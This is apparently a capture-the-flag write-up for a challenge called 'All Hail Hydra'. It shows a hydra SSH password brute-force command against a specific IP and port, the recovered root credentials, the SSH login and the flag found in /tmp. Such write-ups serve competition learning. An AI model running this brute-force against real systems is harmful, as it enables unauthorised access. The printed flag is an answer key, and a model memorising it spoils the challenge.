# All Hail Hydra


## Task
> Rumors have circulated among the hacking comunity that inside the facility Lies a powerful flag, the ultimate prize that grants the possessor unprecedented control over. cyverspace. This flag is said to hold the key 20 accessing top-secret government networks, unlocking untold secrets, and potentially altering the course of history. The flag is Tumored to reside possibly withinthe temporary folder. Note: Be careful to not get detected if bruteforcing.  

> Note: Be Careful to not get detected if bruteforcing.


## Solution
* nslookup for ip  
* bruteforce using hydra with `root` as username  
* `hydra -l root -P wordlist.txt ssh://165.227.210.30 -s 16366`  
* credentials: `root:iloveyou`  
* SSH into the machine:
    * `ssh root@0.cloud.chals.io -p 16366`
* go to `/tmp`   
* FLAG: `KPMG_CTF{ed0d1d2926547a24488d29fb5c3941be}`
